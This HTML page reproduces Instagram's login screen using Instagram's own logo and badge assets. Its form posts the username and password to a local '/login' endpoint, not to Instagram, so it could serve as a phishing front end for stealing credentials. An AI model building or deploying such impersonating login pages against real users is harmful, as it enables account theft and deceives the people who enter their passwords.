<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <form action="/login" method="POST">
                <div class="instagram-text">
                    <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
                </div>
                <input type="text" placeholder="Phone number, username, or email" class="input-box" name="username" required>
                <input type="password" placeholder="Password" class="input-box" name="password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="forgot-pass">
                <a href="#">Forgot password?</a>
            </div>
            <div class="or-divider">
                <hr><span>OR</span><hr>
            </div>
            <div class="fb-login">
                <button class="fb-btn">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook"> Log in with Facebook
                </button>
            </div>
            <div class="signup">
                <span>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a></span>
            </div>
        </div>
        <div class="download-apps">
            <p>Get the app.</p>
            <div class="app-links">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" style="width: 135px; height: 40px;">
                <img alt="Get it from Microsoft" class="x1vqgdyp" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" style="width: 115px; height: 40px;">
            </div>
        </div>
    </div>
</body>
</html>
